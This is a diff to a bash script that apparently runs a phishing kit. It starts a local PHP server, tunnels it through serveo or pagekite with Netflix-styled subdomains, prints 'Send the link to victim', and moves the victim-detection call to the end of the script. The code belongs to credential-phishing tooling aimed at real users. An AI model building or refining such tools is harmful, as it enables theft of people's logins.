@@ -136,7 +136,7 @@ printf "\e[0m\n"
 printf "\e[0m\n"
 printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n" $link
 
-victimfound
+
 }
 
 start_serveo() {
@@ -188,7 +188,7 @@ printf "\e[0m\n"
 printf ' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Send the link to victim :\e[0m\e[1;93m %s \n' $serv_link
 printf "\n"
 
-victimfound
+
 }
 
 start_pagekite() {
@@ -238,14 +238,15 @@ cd .www/ && php -S localhost:$pagekite_port > /dev/null 2>&1 &
 if [[ $pagekite_subdomain_resp == true ]]; then
 sleep 1
 python2 .www/.pagekite --clean --signup $pagekite_port $pagekite_subdomain.pagekite.me
-
 else
 sleep 1
 python2 .www/.pagekite --clean --signup $pagekite_port netflix$RANDOM.pagekite.me
 fi
-victimfound
+
+
 }
 
 banner
 req
 menu
+victimfound
